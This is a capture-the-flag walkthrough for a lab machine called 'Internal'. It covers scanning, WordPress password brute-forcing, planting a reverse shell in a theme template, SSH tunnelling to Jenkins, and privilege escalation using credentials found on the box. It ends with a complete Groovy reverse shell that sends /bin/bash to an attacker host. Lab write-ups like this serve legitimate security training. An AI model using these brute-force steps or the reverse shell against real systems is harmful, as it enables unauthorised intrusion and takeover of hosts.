```
Name: Internal
```

```
IP address: 10.10.87.17
```

```
Task 1: I understand the scope of work
```

```
Task 2: User.txt Flag
```
1. Lets add a new entry in the hosts file as mentioned in the *Briefing*.
2. Lets run a masscan on the machine and look for open ports `masscan -p1-65535 10.10.87.17 -e tun0`
3. As we can see the port *80* is open lets navigate to *http://internal.thm/* we see a Apache default page.
```
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-02 17:13:14 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.87.17                                     
Discovered open port 22/tcp on 10.10.87.17  
```
4. Lets run nmap scan to enumerate the ports and get the services being run on them. `nmap 10.10.87.17 -sC -sV -O -oA internal -p80,22`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.92 seconds
```
5. Let run ffuf to check the accessible directories `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://internal.thm/FUZZ -mc 200,302,405,301 -o relevant.txt --rate 1000`
6. We find two intersting entries */blog* and */wordpress* which indicates that we are facing a wordpress application.
7. Navigating to *http://internal.thm/blog/* we can see there are few basic blogs and navigating to *http://internal.thm/blog/wp-login.php* try *admin:admin* giving us an error saying *Invalid password* so we can confirm we have an *admin* user.
8. Lets use wpscan to enumarate vulnerable plugin and users of the wordpress, we also detect the theme being used by wordpress *http://internal.thm/blog/wp-content/themes/twentyseventeen/* we can use this to upload reverse shell in case can crak the admin password.
9. we do not detect any particular interseting vulnerable plugin so lets use password attack on the *admin* user using the wpscan tool `wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin`
10. We were able to crak the password for **admin** user and it is **admin:my2boys** we can now login with the credentials.
11. After logining we find a private post wich carries credentials for **will** `william:arnold147` wordpress does not have any such user so tried **ssh** but failed so they seem to either dummy or can be used in latter attack.
12. We will be editing any current theme page such as **404 template** and try to take reverse shell we will be using php-reverse shell by pentestmonkey.
13. Once we have a successful reverse connection we can see we are www-data user and we will use linepease to further investigate exploits to esclate the priveleges.
14. We do not find much using linpeas but we find an interesting entry under **/opt** a file called **wp-save.txt** which carries a set of credentials for user **aubreanna:bubb13guM!@#123** there is no such wordpress user but there is a user on the machine so we can **ssh** using this credentials.
15. As we **ssh** on to the machine using the credentials of **aubreanna** we get to see user.txt using ls command we then cat the file using `cat user.txt` and get the user flag.

```
Task 3: Root.txt Flag
``` 
1. Under the same directory we also find a file called **jenkins.txt** which indicates a jenkins is running on the machine we cat it and it has following details.
```
Internal Jenkins service is running on 172.17.0.2:8080
```
2. So on doing a ifconfig we came to know that docker is being used and its IP address is `172.17.0.1` and jenkins is hosted on `172.17.0.2` port `8080` so we will have to tunnel to that IP address through ssh using the **aubreanna** user.
3. So lets SSH on the box again and this time lets create a tunnel via SSH so that we can access the Jenkins implementation `ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.132.54`.
4. No using a browser navigate to `http://localhost:8080` and thanks to SSH tunneling we can access the Jenkins server.
5. Lets try to enumerate password for the `admin` user we will use BurpSuite community edition for that.
6. We are able to crack the password `admin:spongebob`.
7. Now we have to take a reverse connection using the Jenkins script console. We will be using `https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76` to get a reverse connection.
8. Now we have access of the user `will` but we still are not root.
9. Lets enumerate the box manually first and as expected we got another note under **/opt** folder.
10. The note file contains password for the root user `root:tr0ub13guM!@#123`.
11. Finally lets SSH into the the box and get the root flag.


**Note:Groovy Shell for Reverse connection from Jenkins**
```
String host="IP-Address";
int port=9002;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
